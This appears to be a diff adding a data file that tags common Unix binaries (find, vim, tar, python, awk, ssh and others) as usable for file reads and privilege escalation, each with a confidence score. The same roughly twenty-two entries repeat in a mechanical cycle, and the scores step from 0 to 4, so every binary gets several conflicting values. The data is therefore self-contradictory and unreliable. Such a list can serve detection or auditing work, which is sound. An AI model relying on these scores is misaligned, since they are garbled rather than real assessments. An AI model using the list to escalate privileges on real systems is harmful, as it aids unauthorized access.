+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
